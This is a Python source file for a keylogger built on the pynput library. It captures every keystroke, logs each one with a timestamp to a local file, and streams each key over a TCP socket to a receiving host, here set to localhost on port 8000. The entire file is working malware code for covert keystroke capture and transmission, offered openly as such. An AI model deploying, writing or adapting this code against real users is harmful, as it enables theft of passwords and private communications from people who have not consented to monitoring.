'''
    Rudimentary keylogger based on Moses Palmer's code and plugin.  Made adjustments for the Py3.6.
'''

from pynput.keyboard import Key, Listener
import logging
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host ="localhost"
port = 8000
s.connect((host,port))

log_dir = ""

logging.basicConfig(filename=(log_dir + 'key_log.txt'), level=logging.DEBUG, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')

try:
    def on_press(key):
        logging.info(str(key))
        #print(str(key))
        s.send(str(key).encode()) 

    with Listener(on_press=on_press) as listener:
        listener.join()
        
except KeyboardInterrupt:
    s.close ()
    exit()


